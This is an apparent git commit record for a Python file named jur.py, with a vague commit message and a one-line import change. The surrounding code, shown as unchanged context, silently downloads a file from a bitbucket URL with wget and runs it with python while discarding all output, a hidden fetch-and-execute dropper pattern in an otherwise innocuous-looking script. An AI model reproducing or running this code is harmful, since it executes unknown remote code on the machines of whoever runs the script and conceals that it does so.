da2f9b52bcfb59aa97c3b7a793eaab98f9978bf1
gakira munshi <gakimarki@proton.me>
2024-12-03 19:10:11 -0500

    Fixed some shit

--- jur.py
+++ jur.py
@@ -1,3 +1,3 @@
-import os, sys,itertools
+import os, sys,mailbox
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
